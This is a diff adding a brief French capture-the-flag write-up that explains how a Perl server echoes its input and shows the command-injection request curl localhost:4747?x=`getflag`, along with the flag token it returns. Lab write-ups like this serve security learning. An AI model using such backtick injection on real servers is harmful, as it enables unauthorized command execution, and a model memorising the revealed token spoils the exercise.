@@ -1,0 +1,11 @@
+
+D'après le code qu'on trouve dans le fichier, le serv perl va afficher avec echo le result de la commande envoyée
+
+Donc comme l'exo d'avant, l'idée est de faire executer par le script perl la commande "getflag" donc tout simplement on va faire
+
+ curl localhost:4747?x=\`getflag\`
+
+ ce qui retourne :
+
+ Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
